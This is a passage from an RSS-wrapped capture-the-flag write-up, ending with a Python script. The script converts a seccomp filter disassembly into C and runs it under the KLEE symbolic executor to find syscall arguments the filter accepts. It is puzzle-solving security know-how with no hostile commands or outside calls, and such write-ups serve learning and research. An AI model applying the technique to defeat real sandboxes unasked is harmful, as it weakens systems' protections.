class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# split the large output into 8 separate files properly &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;split_files&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;filename&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(filename, &lt;span class=&#34;string&#34;&gt;&amp;quot;r&amp;quot;&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; f:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        disassembly = f.readlines()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    LINES_PER_FILE=&lt;span class=&#34;number&#34;&gt;3797&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; line &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; disassembly:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (i % LINES_PER_FILE == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;# open the next file to disassemble &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            file_number = i // LINES_PER_FILE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (i != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                f.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                f = &lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;disassembly_&lt;span class=&#34;subst&#34;&gt;&amp;#123;file_number&amp;#125;&lt;/span&gt;.txt&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;w&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                f = &lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;disassembly_&lt;span class=&#34;subst&#34;&gt;&amp;#123;file_number&amp;#125;&lt;/span&gt;.txt&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;w&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        f.write(&lt;span class=&#34;string&#34;&gt;&amp;#x27; &amp;#x27;&lt;/span&gt;.join(line.split()[&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;:]) + &lt;span class=&#34;string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        i += &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;program_head = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#include &amp;lt;stdint.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#include &amp;lt;stdbool.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#include &amp;lt;assert.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#include &amp;quot;klee/klee.h&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#define ERRNO(x) (x)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#define KILL 2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#define ALLOW 1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#define EM_X86_64 62&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#define __AUDIT_ARCH_64BIT 0x80000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#define __AUDIT_ARCH_LE 0x40000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#define AUDIT_ARCH_X86_64 (EM_X86_64 | __AUDIT_ARCH_64BIT | __AUDIT_ARCH_LE)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;prog_main = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;int main(int argc, char * argv[]) &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    uint64_t args[6];&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    klee_make_symbolic(args, sizeof(args), &amp;quot;args&amp;quot;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    uint8_t result = filter(args);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    // Did the filter return zero?&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    klee_assume(result == 0);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    // If we reach this point, we found a solution&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    klee_assert(0);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    return 0;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;function_init = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;uint8_t filter(uint64_t args[6]) &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    // initialize memory and registers&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    uint32_t A = 0;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    uint32_t X = 0;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    // fix architecture and syscall number&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    uint32_t sys_number = 0x1337;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    uint32_t arch = AUDIT_ARCH_X86_64;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    uint32_t mem[16] = &amp;#123;0&amp;#125;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    [FUNCTION BODY]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# return the line number that control flow will go to, given a line&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;goto_target&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;line: &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    line = line.split()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; line[&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# generate function body &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# need to keep track of line number, starting from 1, to insert goto_label into line&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;parse_disassembly&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;disassembly&lt;/span&gt;):    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    c_code = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; line_number, line &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;enumerate&lt;/span&gt;(disassembly):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        line_number += &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;comment&#34;&gt;# line number is normally zero-indexed&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# if line has a goto statement, most important &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;goto&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; line:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;# store line number and insert &amp;quot;LABEL_&amp;quot; + line_number + &amp;quot;_&amp;quot; in next line &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            goto_line = goto_target(line)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;# insert label&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            c_code += line.replace(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(goto_line), &lt;span class=&#34;string&#34;&gt;f&amp;quot;LABEL_&lt;span class=&#34;subst&#34;&gt;&amp;#123;goto_line&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            c_code += &lt;span class=&#34;string&#34;&gt;&amp;quot;LABEL_&amp;quot;&lt;/span&gt; + goto_line + &lt;span class=&#34;string&#34;&gt;&amp;quot;: &amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            c_code += line &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; c_code &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    split_files(&lt;span class=&#34;string&#34;&gt;&amp;quot;full_disasm.txt&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# iterate through all the disassembly files to parse out &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; file_number &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;disassembly_&lt;span class=&#34;subst&#34;&gt;&amp;#123;file_number&amp;#125;&lt;/span&gt;.txt&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;r&amp;quot;&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; f:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            disassembly = f.readlines()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        c_code = parse_disassembly(disassembly)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;filter_&lt;span class=&#34;subst&#34;&gt;&amp;#123;file_number&amp;#125;&lt;/span&gt;.c&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;w&amp;quot;&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; f:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            program = program_head + &lt;span class=&#34;string&#34;&gt;&amp;quot;\n\n&amp;quot;&lt;/span&gt; + function_init.replace(&lt;span class=&#34;string&#34;&gt;&amp;quot;[FUNCTION BODY]&amp;quot;&lt;/span&gt;, c_code) + prog_main &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            f.write(program)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;string&#34;&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    main()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;All in all, this was a very fun challenge for me to solve - with lots to learn. GGs to the author from IrisSec for making such a unique challenge!&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
